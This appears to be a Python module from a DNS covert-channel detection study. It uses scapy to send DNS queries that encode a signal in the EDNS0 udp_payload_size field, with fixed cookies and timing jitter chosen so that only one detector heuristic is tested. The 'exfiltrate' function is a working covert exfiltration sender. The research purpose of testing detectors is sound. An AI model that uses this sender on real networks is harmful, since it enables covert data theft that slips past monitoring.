#!/usr/bin/env python3
"""
Base comum para T4-variantes R1..R4.

Cada regime R{n} fornece um gerador de udp_payload_size (ups). O modulo
base envia N queries DNS contra o resolver, com 1 ups distinto (ou nao,
dependendo do regime) por query, src_port fixo durante o run.

Diferenca em relacao a T4 canonica (t4_bufsize.py): T4 original
implementa um regime especifico; aqui isolamos 4 regimes em modulos
separados para validar a robustez do limiar 0.5 de H4 contra variacoes
estatisticas diferentes (incluindo adversario consciente).

Numero de queries por execucao: N = len(payload) // 8 (consistente com
T3-variant). O payload em si nao e codificado nos bytes — em T4 o canal
e o proprio campo CLASS do OPT pseudo-RR (ups). O payload aqui serve
apenas para parametrizar quantidade de queries enviadas, de modo a
permitir variar carga estatistica entre runs (256..4096 bytes
=> 32..512 queries).
"""

import os
import random
import time

from scapy.all import IP, UDP, send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

COOKIE_OPT_CODE = 10  # RFC 7873. Cookie cliente nominal 8 bytes
                      # (anclora estrutural; nao aciona H1/H2/H3).


def build_query(domain: str, ups: int,
                dns_server: str, src_port: int,
                cookie_bytes: bytes):
    """Constroi 1 query DNS com udp_payload_size = ups.

    cookie_bytes (8 bytes) e fixo durante o run para isolar o sinal de
    H4. Cookie identico em todas as queries da sessao -> H3 nao dispara
    (ratio = 1/N pequeno). Length = 8 -> H2 nao dispara. Code 10 -> H1a
    nao dispara. So H4 deve disparar (ou nao) conforme regime de ups.
    """
    cookie = EDNS0TLV(
        optcode=COOKIE_OPT_CODE,
        optlen=8,
        optdata=cookie_bytes,
    )
    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=src_port) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(
                rclass=ups,
                rdata=[cookie],
            )
        )
    )
    return pkt


def exfiltrate(ups_sequence,
               domain: str,
               dns_server: str,
               src_port: int,
               interval: float = 0.04,
               jitter: float = 0.02) -> int:
    """Envia 1 query por valor em ups_sequence, src_port + cookie fixos."""
    cookie_bytes = os.urandom(8)  # fixo durante o run
    sent = 0
    for idx, ups in enumerate(ups_sequence):
        subdomain = f"v{idx}.{domain}"
        pkt = build_query(subdomain, ups, dns_server, src_port, cookie_bytes)
        send(pkt, verbose=0)
        sent += 1
        sleep_for = interval + random.uniform(-jitter, jitter)
        time.sleep(max(0.0, sleep_for))
    return sent


def payload_to_n_queries(payload_size: int) -> int:
    """Converte tamanho do payload (bytes) em numero de queries.

    8 bytes por query (consistente com T3-variant). Minimo 5 queries
    (para H4 atingir MIN_EVENTS); cap pratico em 512 (4096 / 8).
    """
    n = max(5, payload_size // 8)
    return min(n, 512)
